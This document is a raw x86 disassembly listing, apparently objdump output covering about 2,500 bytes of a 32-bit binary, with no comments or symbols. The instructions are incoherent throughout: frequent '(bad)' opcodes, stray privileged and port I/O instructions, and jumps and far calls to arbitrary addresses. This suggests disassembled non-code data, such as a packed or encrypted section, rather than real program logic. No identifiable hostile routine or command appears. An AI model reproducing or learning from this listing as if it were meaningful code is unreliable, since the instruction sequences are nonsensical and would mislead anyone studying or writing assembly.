  4194cb:	andnps xmm5,xmm3
  4194ce:	mov    al,0xd7
  4194d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194d1:	mov    eax,0xa60cbdad
  4194d6:	jmp    0x40b8f6a7
  4194db:	cmp    bh,BYTE PTR [esi]
  4194dd:	mov    ch,0x21
  4194df:	cdq    
  4194e0:	ss pop edi
  4194e2:	push   cs
  4194e3:	cmp    DWORD PTR [eax],ecx
  4194e5:	push   es
  4194e6:	jnp    0x419543
  4194e8:	stc    
  4194e9:	sahf   
  4194ea:	leave  
  4194eb:	inc    ebp
  4194ec:	sti    
  4194ed:	add    bh,BYTE PTR [ecx+0x2df560d6]
  4194f3:	cmp    ecx,DWORD PTR [ecx]
  4194f5:	leave  
  4194f6:	jbe    0x41952b
  4194f8:	mov    eax,esi
  4194fa:	sbb    edx,edi
  4194fc:	xor    eax,0x9199be3f
  419501:	int    0xaa
  419503:	mov    ?,WORD PTR [ecx-0xd6ebdb8]
  419509:	mov    esi,0x3b23d923
  41950e:	scas   al,BYTE PTR es:[edi]
  41950f:	shr    esp,1
  419511:	je     0x419546
  419513:	iret   
  419514:	pcmpeqb mm3,QWORD PTR ds:0x251f0f34
  41951b:	ja     0x419515
  41951d:	mov    dh,0x9a
  41951f:	fdivr  QWORD PTR [ecx+0x495b4128]
  419525:	cmp    DWORD PTR [edx-0xb],edx
  419528:	rcl    BYTE PTR [edx+0x428d9a38],0x2d
  41952f:	and    DWORD PTR [ebx],edi
  419531:	sub    BYTE PTR [ebp-0x34],0xb5
  419535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419536:	les    esi,FWORD PTR [edi+0x7204225e]
  41953c:	mov    ah,BYTE PTR [edi]
  41953e:	and    bl,BYTE PTR [eax-0x76]
  419541:	outs   dx,DWORD PTR ds:[esi]
  419542:	mov    al,ds:0x7af88d30
  419547:	clc    
  419548:	repnz or edi,DWORD PTR [esi-0x5cb62cf0]
  41954f:	xchg   ecx,eax
  419550:	jbe    0x4194e3
  419552:	cld    
  419553:	ret    
  419554:	cmp    al,0xd1
  419556:	test   BYTE PTR [esi-0x4b],cl
  419559:	popa   
  41955a:	mov    ecx,0x857e53a3
  41955f:	and    dl,ah
  419561:	or     ch,BYTE PTR [edx+0x1e]
  419564:	mov    esi,DWORD PTR [eax]
  419566:	mov    ch,0x99
  419568:	mov    ds:0x7b6868e5,eax
  41956d:	(bad)  
  41956e:	push   edx
  41956f:	adc    dh,BYTE PTR [edi]
  419571:	cmp    dl,dh
  419573:	jne    0x41951e
  419575:	std    
  419576:	and    bh,BYTE PTR [edi*2-0x601d936b]
  41957d:	pop    ebx
  41957e:	pop    ebx
  41957f:	cmp    al,0xdf
  419581:	sahf   
  419582:	rcr    BYTE PTR [ebx-0x5501f708],1
  419588:	dec    esp
  419589:	ret    0xb65
  41958c:	mov    ds:0x81ee4f1e,eax
  419591:	cmp    bl,BYTE PTR [ecx+0x31d08da1]
  419597:	sub    BYTE PTR [edi],ah
  419599:	xor    al,0x89
  41959b:	and    edi,eax
  41959d:	and    al,0x9c
  41959f:	clc    
  4195a0:	push   ecx
  4195a1:	mov    ds:0x2d0ff9c5,eax
  4195a6:	jmp    FWORD PTR [edi-0x1e]
  4195a9:	jmp    0x4195d0
  4195ab:	out    dx,eax
  4195ac:	stos   BYTE PTR es:[edi],al
  4195ad:	fwait
  4195ae:	imul   ebx,DWORD PTR [ecx+ebp*2],0x57
  4195b2:	cmp    al,BYTE PTR [ecx-0x7e]
  4195b5:	addr16 in eax,0x7f
  4195b8:	xchg   edi,eax
  4195b9:	popa   
  4195ba:	sbb    al,0xd4
  4195bc:	iret   
  4195bd:	jmp    0x419583
  4195bf:	sbb    al,0x97
  4195c1:	clc    
  4195c2:	mov    ebx,ds
  4195c4:	retf   0x8ee
  4195c7:	sti    
  4195c8:	inc    ecx
  4195c9:	shl    DWORD PTR [ebx+0x3a],1
  4195cc:	and    ebx,edi
  4195ce:	cli    
  4195cf:	das    
  4195d0:	call   0xb600a52a
  4195d5:	push   eax
  4195d6:	mov    edi,0xd40bb583
  4195db:	nop    ecx
  4195de:	adc    al,0x5d
  4195e0:	and    BYTE PTR [edx+eiz*4],ch
  4195e3:	mov    ah,0x2e
  4195e5:	push   0xa6b99c7d
  4195ea:	dec    edi
  4195eb:	mov    ds:0xd14cb51b,al
  4195f0:	outs   dx,BYTE PTR ds:[esi]
  4195f1:	or     DWORD PTR [edx-0x6a8fba03],eax
  4195f7:	xchg   ebx,eax
  4195f8:	jmp    0x191:0xad5c45f1
  4195ff:	test   eax,0xa30db4b7
  419604:	shl    DWORD PTR [edx],cl
  419606:	and    edi,DWORD PTR [ebx-0x1a]
  419609:	mov    edi,0x526536cd
  41960e:	adc    al,0xc3
  419610:	sub    DWORD PTR [ebp+0x22049847],0xfffffff1
  419617:	sub    dh,BYTE PTR [eax-0x59]
  41961a:	daa    
  41961b:	fst    QWORD PTR [edx+0x71b8a39d]
  419621:	lar    esi,sp
  419624:	fwait
  419625:	push   ecx
  419626:	mov    ebp,0x58ca3376
  41962b:	mov    DWORD PTR [ecx],ebp
  41962d:	aam    0x6e
  41962f:	push   esp
  419630:	jle    0x419671
  419632:	pop    ebp
  419633:	push   edi
  419634:	inc    ebx
  419635:	add    DWORD PTR [eax],0xea37c79b
  41963b:	popa   
  41963c:	xchg   edx,eax
  41963d:	(bad)  
  41963e:	cld    
  41963f:	sub    ebx,DWORD PTR [ecx]
  419641:	push   cs
  419642:	(bad)  
  419643:	pop    edx
  419644:	gs sti 
  419646:	xchg   DWORD PTR [ebx+0x6affa391],ecx
  41964c:	inc    ebp
  41964d:	jae    0x419684
  41964f:	aam    0xec
  419651:	pop    ss
  419652:	mov    eax,0x867037aa
  419657:	and    BYTE PTR [edi],dl
  419659:	(bad)  
  41965b:	xchg   ebp,eax
  41965c:	adc    DWORD PTR [ebx],edx
  41965e:	das    
  41965f:	add    BYTE PTR [eax+0x242fb62f],ch
  419665:	sub    al,0x59
  419667:	pushf  
  419668:	pop    edx
  419669:	das    
  41966a:	cmp    bh,ah
  41966c:	xor    esp,DWORD PTR [si+0x7903]
  419671:	add    ah,dh
  419673:	xor    al,0xd8
  419675:	sbb    ebp,DWORD PTR [ebx]
  419677:	loopne 0x41961a
  419679:	outs   dx,BYTE PTR ds:[esi]
  41967a:	add    ebx,DWORD PTR [edi+0x4d]
  41967d:	fs bswap edi
  419680:	stos   DWORD PTR es:[edi],eax
  419681:	dec    esi
  419682:	adc    ch,BYTE PTR [ebp*1+0x3bd72178]
  419689:	mov    cl,0x65
  41968b:	dec    edi
  41968c:	push   eax
  41968d:	cwde   
  41968e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41968f:	or     al,0x6b
  419691:	lods   eax,DWORD PTR ds:[esi]
  419692:	cdq    
  419693:	xchg   esp,eax
  419694:	jo     0x4196a1
  419696:	xchg   edi,eax
  419697:	mov    cl,0x61
  419699:	xchg   ebx,eax
  41969a:	dec    eax
  41969b:	pop    edi
  41969c:	in     al,dx
  41969d:	inc    edi
  41969e:	and    eax,0x5ce05fb
  4196a3:	add    BYTE PTR [ebx+edx*8-0x622cd213],ah
  4196aa:	and    eax,esi
  4196ac:	std    
  4196ad:	ud1    edi,ecx
  4196b0:	(bad)  
  4196b2:	test   BYTE PTR [edi+0x63],0xfc
  4196b6:	sub    BYTE PTR [ecx-0x44],bl
  4196b9:	mov    bh,0xc
  4196bb:	or     ch,BYTE PTR [edx]
  4196bd:	imul   ebx,DWORD PTR [ebp+0x3cbf5717],0x1b
  4196c4:	rcr    BYTE PTR [eax+0x6d],1
  4196c7:	loopne 0x419722
  4196c9:	cmp    BYTE PTR [eax],dl
  4196cb:	xchg   edx,eax
  4196cc:	xor    esi,edx
  4196ce:	lock scas eax,DWORD PTR es:[edi]
  4196d0:	jp     0x4196ed
  4196d2:	xchg   ebp,eax
  4196d3:	and    eax,0x271ef1fb
  4196d8:	jno    0x4196b1
  4196da:	inc    edx
  4196db:	mov    ebx,0x28cb1094
  4196e0:	fucomip st,st(4)
  4196e2:	push   ds
  4196e3:	mov    bl,0x23
  4196e5:	sbb    BYTE PTR [ebx],al
  4196e7:	or     al,0x1e
  4196e9:	aas    
  4196ea:	mov    ch,0x6
  4196ec:	in     al,dx
  4196ed:	mov    eax,0x8e297963
  4196f2:	imul   edx,edi,0xf11fe429
  4196f8:	sti    
  4196f9:	add    BYTE PTR [esi-0x63],bl
  4196fc:	dec    edx
  4196fd:	dec    esp
  4196fe:	addr16 out dx,al
  419700:	push   ss
  419701:	int    0x6b
  419703:	aaa    
  419704:	push   edi
  419705:	retf   
  419706:	cmp    DWORD PTR [ecx+0x2934b482],0xf150eba5
  419710:	das    
  419711:	pop    ebx
  419712:	fstp   QWORD PTR [esi]
  419714:	scas   eax,DWORD PTR es:[edi]
  419715:	movups XMMWORD PTR [eax],xmm0
  419718:	mov    DWORD PTR [ecx-0x6846ff9e],0x829ff92a
  419722:	aas    
  419723:	push   ss
  419724:	iret   
  419725:	out    0xf4,al
  419727:	fdivr  DWORD PTR [esi]
  419729:	add    DWORD PTR [edx],esp
  41972b:	sti    
  41972c:	adc    eax,0x986a9e91
  419731:	xchg   ebp,eax
  419732:	sbb    dh,BYTE PTR [eax-0x8124365]
  419738:	addr16 push 0xa1054da6
  41973e:	xchg   ebp,eax
  41973f:	lds    ebp,FWORD PTR [esi+0x39]
  419742:	mov    ds:0x88b914a6,eax
  419747:	xor    DWORD PTR [eax],ebx
  419749:	mov    dh,0xf7
  41974b:	std    
  41974c:	adc    DWORD PTR [ecx-0x31],esi
  41974f:	es inc ecx
  419751:	jbe    0x4197d0
  419753:	sar    DWORD PTR [ebx],cl
  419755:	jo     0x419797
  419757:	push   esp
  419758:	jmp    0xf7bade61
  41975d:	into   
  41975e:	mov    fs,WORD PTR [ebp+0x8]
  419761:	push   edi
  419762:	popf   
  419763:	add    eax,0xcb6a2dea
  419768:	lods   eax,DWORD PTR ds:[esi]
  419769:	adc    eax,0xa9723c4b
  41976e:	xor    al,0xa1
  419770:	mov    al,ds:0x60636d9b
  419775:	out    0xd7,al
  419777:	icebp  
  419778:	lock call 0x5ba16493
  41977e:	pop    eax
  41977f:	adc    BYTE PTR ds:0x9fb8b7b9,bh
  419785:	loop   0x4197c3
  419787:	outs   dx,BYTE PTR ds:[esi]
  419788:	xchg   edx,eax
  419789:	push   ss
  41978a:	pop    edi
  41978b:	(bad)
  41978f:	sbb    eax,0x197febcf
  419794:	mov    esi,0xe3dddeeb
  419799:	ss into 
  41979b:	fwait
  41979c:	test   BYTE PTR [eax+0x78],0xc2
  4197a0:	ret    
  4197a1:	fstp   QWORD PTR es:[ecx+0x69d9a6f6]
  4197a8:	mov    BYTE PTR [eax],bl
  4197aa:	push   esi
  4197ab:	popa   
  4197ac:	ret    
  4197ad:	dec    edi
  4197ae:	in     eax,0x79
  4197b0:	jge    0x4197f2
  4197b2:	xor    dh,BYTE PTR [eax-0x75d2784a]
  4197b8:	lods   al,BYTE PTR ds:[esi]
  4197b9:	scas   al,BYTE PTR es:[edi]
  4197ba:	xchg   esp,eax
  4197bb:	fbld   TBYTE PTR [eax-0x4b]
  4197be:	lock and esp,esp
  4197c1:	jb     0x419753
  4197c3:	mov    eax,0x781e838f
  4197c8:	popf   
  4197c9:	and    al,0x23
  4197cb:	lods   eax,DWORD PTR ds:[esi]
  4197cc:	sbb    DWORD PTR [edi-0x176618df],0x7a
  4197d3:	xchg   ebp,eax
  4197d4:	cmp    eax,0xca31b4ee
  4197d9:	iret   
  4197da:	jmp    FWORD PTR [ebx+0x5469d3bb]
  4197e0:	xor    BYTE PTR [esi+0x37],bh
  4197e3:	and    DWORD PTR [edx],edi
  4197e5:	mov    ds:0xdd44de28,eax
  4197ea:	addr16 loopne 0x419844
  4197ed:	push   ds
  4197ee:	sbb    eax,0x9db6d292
  4197f3:	aas    
  4197f4:	pop    esi
  4197f5:	(bad)  
  4197f6:	adc    al,0xbf
  4197f8:	mov    ds,WORD PTR [ecx+0x4c]
  4197fb:	shl    DWORD PTR [edx-0x39],1
  4197fe:	lods   eax,DWORD PTR ds:[esi]
  4197ff:	mov    dl,0xe4
  419801:	sub    ah,BYTE PTR [ebp+0x72]
  419804:	xor    BYTE PTR [edi-0x48],0x2
  419808:	xchg   ecx,eax
  419809:	adc    eax,0xb7248415
  41980e:	fadd   QWORD PTR [edi]
  419810:	out    dx,al
  419811:	cwde   
  419812:	gs mov esp,0xe36155a8
  419818:	pop    edi
  419819:	lods   eax,DWORD PTR ds:[esi]
  41981a:	xchg   ebp,eax
  41981b:	pop    esi
  41981c:	loopne 0x4197d3
  41981e:	les    edi,FWORD PTR [esi-0x4cc263b5]
  419824:	jle    0x4198a5
  419826:	in     eax,0x9b
  419828:	or     DWORD PTR [ebp+0x23a3c9f9],esi
  41982e:	hlt    
  41982f:	and    eax,0x2965d09a
  419834:	adc    BYTE PTR [ebp+0x58fff267],dl
  41983a:	psubq  mm7,QWORD PTR ds:0x318dfa81
  419841:	iret   
  419842:	outs   dx,BYTE PTR ds:[esi]
  419843:	mov    ebp,0xb8b50bbd
  419848:	mov    WORD PTR [ecx],gs
  41984a:	fld    TBYTE PTR [ebx+eax*4+0x36d9b05c]
  419851:	jb     0x419827
  419853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419854:	fs mov al,0xe6
  419857:	adc    DWORD PTR [ebx+0x15],ebp
  41985a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41985b:	xor    DWORD PTR [edx],edx
  41985d:	nop
  41985e:	fcom   QWORD PTR [esi-0x67]
  419861:	sti    
  419862:	rcr    edx,1
  419864:	into   
  419865:	push   ebp
  419866:	aaa    
  419867:	xchg   esp,eax
  419868:	(bad)
  41986c:	sub    eax,0xba92e82c
  419871:	mov    WORD PTR [esi+0x16],ds
  419874:	es or  ebx,edi
  419877:	pop    ds
  419878:	repnz adc eax,eax
  41987b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41987c:	cli    
  41987d:	dec    esp
  41987e:	(bad)  
  419880:	push   cs
  419881:	out    0xe8,ax
  419884:	inc    edi
  419885:	cmp    dl,BYTE PTR [ebx-0x3e6162a5]
  41988b:	rcr    bh,1
  41988d:	push   0x5fa71291
  419892:	mov    ebp,0xf5d816e9
  419897:	adc    esp,DWORD PTR [esi-0x63]
  41989a:	das    
  41989b:	aaa    
  41989c:	xor    al,0xf7
  41989e:	mov    eax,0x5e026b38
  4198a3:	xchg   edx,eax
  4198a4:	pop    es
  4198a5:	imul   edi,eax,0x18
  4198a8:	sub    dl,BYTE PTR [edx+0x43a7722e]
  4198ae:	jecxz  0x4198a4
  4198b0:	cmp    bh,dh
  4198b2:	cs dec ecx
  4198b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b5:	call   0xb018af0c
  4198ba:	fs ja  0x41987c
  4198bd:	mov    ds:0x8b5a2247,al
  4198c2:	stos   DWORD PTR es:[edi],eax
  4198c3:	dec    ecx
  4198c4:	or     eax,0x9d931a58
  4198c9:	xor    ebx,DWORD PTR [ebx+0x3991edfb]
  4198cf:	es xchg ebx,eax
  4198d1:	js     0x41987c
  4198d3:	pop    ebx
  4198d4:	(bad)  
  4198d5:	mov    al,0x90
  4198d7:	pop    edi
  4198d8:	mov    ah,0x6b
  4198da:	or     BYTE PTR [edx],dl
  4198dc:	xchg   ecx,eax
  4198dd:	pop    esp
  4198de:	fsubr  DWORD PTR [ecx-0x7bb81286]
  4198e4:	push   edx
  4198e5:	call   0x60a6:0x4a8e48db
  4198ec:	push   edx
  4198ed:	cmp    eax,0x6e753e5b
  4198f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198f3:	add    ebx,DWORD PTR [ecx+0x68231e4d]
  4198f9:	cwde   
  4198fa:	inc    ebx
  4198fb:	(bad)  
  4198fc:	pop    ebx
  4198fd:	jge    0x419969
  4198ff:	test   eax,0x313d4775
  419904:	add    ah,BYTE PTR [eax-0x4f]
  419907:	mov    ds:0xb8910d31,al
  41990c:	inc    edx
  41990d:	inc    eax
  41990e:	outs   dx,BYTE PTR ds:[esi]
  41990f:	mov    ah,0xd8
  419911:	sub    ecx,ebp
  419913:	mov    eax,ds:0x439b452c
  419918:	in     al,dx
  419919:	ja     0x41992f
  41991b:	cdq    
  41991c:	push   ecx
  41991d:	or     esi,0x830377dd
  419923:	mov    al,ds:0x85d11240
  419928:	xor    DWORD PTR [esi],eax
  41992a:	les    edx,FWORD PTR [eax+ecx*4]
  41992d:	call   0xfe2e521c
  419932:	jno    0x4198c9
  419934:	push   di
  419936:	mov    eax,ds:0x8f4d47aa
  41993b:	sub    al,0x52
  41993d:	add    DWORD PTR [ecx],esi
  41993f:	push   eax
  419940:	inc    esp
  419941:	xchg   ebx,eax
  419942:	psrlq  mm2,QWORD PTR [ebx+0x553b5b6]
  419949:	or     eax,0x6b414a45
  41994e:	cwde   
  41994f:	sub    bl,BYTE PTR [esi]
  419951:	test   BYTE PTR [ebx+0x51],bh
  419954:	inc    ebp
  419955:	loop   0x419990
  419957:	mov    eax,0x86dcee41
  41995c:	jg     0x419948
  41995e:	cdq    
  41995f:	inc    ebx
  419960:	in     eax,0x77
  419962:	or     BYTE PTR [ecx],0x52
  419965:	out    0xab,eax
  419967:	push   esp
  419969:	dec    bh
  41996b:	leave  
  41996c:	mov    bl,0xf5
  41996e:	mov    ebx,fs
  419970:	popa   
  419971:	pushf  
  419972:	dec    esi
  419973:	inc    ebp
  419974:	jmp    0x4199b4
  419976:	retf   0x1382
  419979:	adc    ebp,eax
  41997b:	inc    esi
  41997c:	cli    
  41997d:	jb     0x419992
  41997f:	ds (bad) 
  419981:	aad    0x5
  419983:	and    eax,DWORD PTR es:[ecx-0x77]
  419987:	in     eax,0x6e
  419989:	adc    eax,0xc903e21d
  41998e:	test   eax,0xb4901d14
  419993:	jbe    0x419948
  419995:	jmp    0x851d:0x2f89cf7a
  41999c:	add    BYTE PTR [ebx],0x14
  41999f:	jno    0x4199d3
  4199a1:	pop    esi
  4199a2:	sub    al,0x48
  4199a4:	xchg   edi,eax
  4199a5:	cld    
  4199a6:	je     0x4199db
  4199a8:	fsub   DWORD PTR [ebx-0x7372b22f]
  4199ae:	ret    
  4199af:	ret    0xfdd6
  4199b2:	repz loopne 0x41994f
  4199b5:	frstor [edi-0x1814c9b3]
  4199bb:	in     al,dx
  4199bc:	sbb    esi,DWORD PTR [edx-0x58]
  4199bf:	lods   al,BYTE PTR ds:[esi]
  4199c0:	mov    al,ds:0x5b66a38d
  4199c5:	sub    BYTE PTR [ebx],al
  4199c7:	call   0x8664553f
  4199cc:	jle    0x4199fe
  4199ce:	inc    ecx
  4199cf:	icebp  
  4199d0:	stos   BYTE PTR es:[edi],al
  4199d1:	hlt    
  4199d2:	mov    ah,0x61
	...
  419ba4:	out    0xd2,al
  419ba6:	xchg   esp,eax
  419ba7:	icebp  
  419ba8:	mov    ah,0xf7
  419baa:	out    0xd7,eax
  419bac:	aad    0x75
  419bae:	(bad)  
  419baf:	adc    DWORD PTR [edx+ebx*4-0xf7216b3],eax
  419bb6:	add    DWORD PTR [eax],eax
  419bb8:	and    al,BYTE PTR [edi]
  419bba:	add    BYTE PTR [eax],al
  419bbc:	sub    eax,0xd1bcec2b
  419bc1:	icebp  
  419bc2:	stos   BYTE PTR es:[edi],al
  419bc3:	les    edi,FWORD PTR [edi]
  419bc5:	repz stc 
  419bc7:	and    BYTE PTR [esi+0x58],cl
  419bca:	fmulp  st(6),st
  419bcc:	mov    edx,0xf53e49d1
  419bd1:	fs stos BYTE PTR es:[edi],al
  419bd3:	pushf  
  419bd4:	or     BYTE PTR [ebp-0xdafed35],dl
  419bda:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bdc:	mov    eax,ds:0x706ec0e6
  419be1:	(bad)  
  419be2:	jmp    0x419c34
  419be4:	push   esp
  419be5:	push   es
  419be6:	add    cl,BYTE PTR [ebx-0x63beec77]
  419bec:	out    0x8e,eax
  419bee:	jbe    0x419bf6
  419bf0:	out    dx,al
  419bf1:	push   ss
  419bf2:	dec    edi
  419bf3:	outs   dx,BYTE PTR ds:[esi]
  419bf4:	arpl   bx,ax
  419bf6:	jp     0x419bf3
  419bf8:	add    al,0xcc
  419bfa:	in     eax,dx
  419bfb:	sub    edi,DWORD PTR [esi+eax*1-0x75]
  419bff:	fucomip st,st(3)
  419c01:	sub    BYTE PTR [edi+0x66],0xf6
  419c05:	mov    edx,ecx
  419c07:	jns    0x419ba0
  419c09:	shl    BYTE PTR [eax+0x41d0d6b4],cl
  419c0f:	xor    ecx,DWORD PTR [edi-0x6f020c47]
  419c15:	rol    BYTE PTR [esp+esi*1+0x7eae31d4],0xfd
  419c1d:	sbb    eax,0x4aaf2056
  419c22:	cld    
  419c23:	jmp    FWORD PTR [ecx]
  419c25:	mov    fs,eax
  419c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c28:	jae    0x419be5
  419c2a:	shld   DWORD PTR [ebx],ebx,cl
  419c2d:	xchg   esp,eax
  419c2e:	add    al,0xb6
  419c30:	mov    esp,DWORD PTR [ecx+0x26]
  419c33:	jno    0x419c8d
  419c35:	call   0x95f19447
  419c3a:	test   BYTE PTR ds:0x22f37aab,bl
  419c40:	(bad)  [ebp+0x78]
  419c43:	sar    dh,cl
  419c45:	cwde   
  419c46:	das    
  419c47:	mov    dh,0x58
  419c49:	in     eax,0x77
  419c4b:	ret    
  419c4c:	es or  bl,ah
  419c4f:	(bad)  
  419c50:	fld    TBYTE PTR [ebx]
  419c52:	hlt    
  419c53:	xchg   edi,eax
  419c54:	je     0x419c4a
  419c56:	mov    ch,bh
  419c58:	or     esp,DWORD PTR [edi]
  419c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5b:	xor    BYTE PTR [edx+ebx*8+0x74d5464f],ch
  419c62:	mov    DWORD PTR [eax-0x70486ebe],ebp
  419c68:	fldcw  WORD PTR [eax+0x242189ff]
  419c6e:	inc    esi
  419c6f:	inc    edi
  419c70:	xor    dh,0xf3
  419c73:	sub    al,0xdd
  419c75:	xchg   esp,eax
  419c76:	lds    ebx,FWORD PTR [eax-0x591ed2c8]
  419c7c:	adc    ah,BYTE PTR ds:0xfae678d5
  419c82:	lds    esi,FWORD PTR ds:0x5de15ae5
  419c88:	das    
  419c89:	adc    al,0xae
  419c8b:	and    DWORD PTR [edi-0x52],ecx
  419c8e:	push   0x6
  419c90:	ins    DWORD PTR es:[edi],dx
  419c91:	das    
  419c92:	sbb    DWORD PTR [ecx+0x568a1acb],ebx
  419c98:	adc    eax,0xed04fc3a
  419c9d:	jg     0x419cec
  419c9f:	fucomi st,st(4)
  419ca1:	test   eax,0x19675836
  419ca6:	in     al,dx
  419ca7:	outs   dx,DWORD PTR ds:[esi]
  419ca8:	dec    esp
  419ca9:	icebp  
  419caa:	adc    DWORD PTR [eax-0x4],edi
  419cad:	sub    BYTE PTR [esi+0x1f],bl
  419cb0:	ss jno 0xb294b092
  419cb7:	push   eax
  419cb8:	out    dx,al
  419cb9:	mov    ch,0x2f
  419cbb:	arpl   WORD PTR [ebp+ebx*2+0x58],bp
  419cbf:	jp     0x419c86
  419cc1:	sbb    ebp,DWORD PTR [esi+0xb577312]
  419cc7:	pop    edx
  419cc8:	es push 0xffffffcb
  419ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ccc:	fld    QWORD PTR [edx+0x23]
  419ccf:	sbb    al,0x69
  419cd1:	fcom   DWORD PTR [edi]
  419cd3:	ret    0x9ff7
  419cd6:	dec    ebx
  419cd7:	test   BYTE PTR [ecx+0x72],cl
  419cda:	lds    ebx,FWORD PTR [edi-0x3b]
  419cdd:	stos   BYTE PTR es:[edi],al
  419cde:	aaa    
  419cdf:	sti    
  419ce0:	test   al,0xca
  419ce2:	and    eax,0x13e199c0
  419ce7:	loope  0x419caa
  419ce9:	inc    edi
  419cea:	fs enter 0xfebb,0x81
  419cef:	and    eax,0x52032344
  419cf4:	sbb    DWORD PTR [edx],0xad0b0a55
  419cfa:	mov    BYTE PTR [ebp-0x6776df65],0x6c
  419d01:	mov    ds:0xe1e4ac5e,eax
  419d06:	scas   al,BYTE PTR es:[edi]
  419d07:	cmp    BYTE PTR [ecx+0x40],0x66
  419d0b:	cmp    eax,DWORD PTR [edx-0x5e81bd7d]
  419d11:	repz add al,0xed
  419d14:	int3   
  419d15:	ret    0xd19d
  419d18:	call   0x60288b31
  419d1d:	mov    al,ds:0x33026b6c
  419d22:	jnp    0x419da2
  419d24:	test   eax,0x8697c92f
  419d29:	or     DWORD PTR [eax-0x15],ecx
  419d2c:	fcom   DWORD PTR [edx+ebp*4+0x6a]
  419d30:	push   0x5b
  419d32:	aas    
  419d33:	and    al,ah
  419d35:	popa   
  419d36:	mov    al,0x2b
  419d38:	mov    dl,BYTE PTR [ebx+0x71]
  419d3b:	lds    esi,FWORD PTR [ebp+0x37]
  419d3e:	leave  
  419d3f:	push   esi
  419d40:	lock lods al,BYTE PTR ds:[esi]
  419d43:	fiadd  DWORD PTR fs:[ecx]
  419d46:	adc    ch,BYTE PTR [eax+0x39bda754]
  419d4c:	test   ecx,ebx
  419d4e:	pusha  
  419d4f:	int3   
  419d50:	mov    esp,0x4928e1a6
  419d55:	mov    DWORD PTR [ebx],ecx
  419d57:	xor    cl,BYTE PTR [edi+0x3b]
  419d5a:	fcom   QWORD PTR [esi+0x6d]
  419d5d:	pop    eax
  419d5e:	iret   
  419d5f:	add    eax,0xf4115349
  419d64:	(bad)  
  419d66:	cld    
  419d67:	jmp    0x419d7a
  419d69:	mov    BYTE PTR [ebx],ah
  419d6b:	lea    ebx,[ecx+0x52]
  419d6e:	add    edx,DWORD PTR [esi]
  419d70:	cwde   
  419d71:	dec    edi
  419d72:	push   DWORD PTR [edi-0x14]
  419d75:	push   edi
  419d76:	call   0x60dcea64
  419d7b:	lods   eax,DWORD PTR ds:[esi]
  419d7c:	or     DWORD PTR [ebx],ebx
  419d7e:	xor    eax,0xb2471d68
  419d83:	mov    dh,0xff
  419d85:	ins    DWORD PTR es:[edi],dx
  419d86:	xchg   edx,eax
  419d87:	adc    esp,0xffffff9c
  419d8a:	jle    0x419d34
  419d8c:	pop    ss
  419d8d:	mov    ch,0xf0
  419d8f:	jmp    0x1a20d871
  419d94:	pop    ss
  419d95:	mov    ecx,0xf26825eb
  419d9a:	mov    ah,0x3b
  419d9c:	xchg   ecx,eax
  419d9d:	test   BYTE PTR [ecx],ah
  419d9f:	adc    esp,DWORD PTR ss:[eax+ebx*8]
  419da3:	mov    ah,0x91
  419da5:	xchg   esp,eax
  419da6:	stos   BYTE PTR es:[edi],al
  419da7:	cmp    eax,0x9cd8c23c
  419dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dad:	mov    ebp,0xbb4100be
  419db2:	mov    bl,0xc4
  419db4:	retf   
  419db5:	xchg   esp,eax
  419db6:	inc    ebp
  419db7:	outs   dx,BYTE PTR ds:[esi]
  419db8:	cmp    al,0x2e
  419dba:	jg     0x419d54
  419dbc:	shl    DWORD PTR [ebx-0x7b2a65cf],0x4a
  419dc3:	or     bl,BYTE PTR [ecx+0x32]
  419dc6:	bound  ebp,QWORD PTR [ebx]
  419dc8:	sbb    DWORD PTR [ecx+0xace1059],esp
  419dce:	adc    bh,ah
  419dd0:	push   ss
  419dd1:	sub    BYTE PTR [eax+ecx*1],ch
  419dd4:	and    eax,0x59fcae79
  419dd9:	inc    ebx
  419dda:	aas    
  419ddb:	mov    esp,0xa0d76bd6
  419de0:	call   0x872e137b
  419de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de6:	pop    edi
  419de7:	dec    esp
  419de8:	ja     0x419de1
  419dea:	push   edx
  419deb:	call   0x84a5:0x8b59d851
  419df2:	mov    bh,0x5b
  419df4:	sbb    esi,ecx
  419df6:	xor    ah,dl
  419df8:	jae    0x419dcb
  419dfa:	inc    ecx
  419dfb:	cdq    
  419dfc:	push   edi
  419dfd:	retf   
  419dfe:	and    eax,0xa236a03b
  419e03:	loope  0x419dbb
  419e05:	push   edx
  419e06:	inc    BYTE PTR [edx+0x24]
  419e09:	cwde   
  419e0a:	mov    ss,WORD PTR [eax]
  419e0c:	push   gs
  419e0e:	inc    edx
  419e0f:	xor    eax,0xeaebe806
  419e14:	dec    esi
  419e16:	fucomi st,st(1)
  419e18:	jae    0x419e99
  419e1a:	jno    0x419dcc
  419e1c:	pop    ebx
  419e1d:	mov    esi,0xce0a3160
  419e22:	pop    ds
  419e23:	pop    es
  419e24:	xchg   esi,eax
  419e25:	shl    DWORD PTR [esi-0x700171fc],cl
  419e2b:	push   edx
  419e2c:	inc    esp
  419e2d:	je     0x419ea8
  419e2f:	xchg   ch,ah
  419e31:	dec    esi
  419e32:	cld    
  419e33:	vminps ymm6,ymm6,YMMWORD PTR [edi+eax*1+0x392da8df]
  419e3c:	(bad)  
  419e3d:	or     ah,bh
  419e3f:	scas   al,BYTE PTR es:[edi]
  419e40:	retf   
  419e41:	fbstp  TBYTE PTR [ebp-0x20]
  419e44:	jo     0x419eb9
  419e46:	into   
  419e47:	add    DWORD PTR [ebx],edi
  419e49:	sub    al,0xb3
  419e4b:	mov    edi,0xa93d49f
  419e50:	outs   dx,DWORD PTR ds:[esi]
  419e51:	jae    0x419e03
  419e53:	jbe    0x419e7e
  419e55:	sbb    eax,0x70e681fc
  419e5a:	rol    DWORD PTR [edi+0x1d],cl
  419e5d:	icebp  
  419e5e:	xchg   esi,eax
  419e5f:	jne    0x419e23
  419e61:	lock cli 
